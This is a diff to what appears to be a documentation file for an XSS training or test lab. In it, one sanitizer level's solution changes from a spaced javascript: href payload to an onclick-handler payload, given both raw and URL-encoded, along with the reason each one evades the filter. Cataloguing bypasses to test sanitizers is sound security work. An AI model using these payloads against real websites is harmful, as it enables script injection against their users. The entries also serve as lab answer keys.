@@ -42,10 +42,10 @@ Hand-rolled sanitizers that pass the most-obvious payload but break on context o
 
 ### sanitizer-level6
 
-`/sanitizer/level6/?query=%3Ca%20href%20=%20%22javascript:alert(1)%22%3Eclick%3C/a%3E`
+`/sanitizer/level6/?query=%3Ca%20href=x%20onclick=alert(1)%3Eclick%3C/a%3E`
 
-- payload: `<a href ="javascript:alert(1)">click</a>`
-- context: protocol-strip regex requires no space before `=`; extra space evades
+- payload: `<a href=x onclick=alert(1)>click</a>`
+- context: `<a>` allowed and only href=javascript: rewritten; handlers survive
 
 ### sanitizer-edge-level1
 
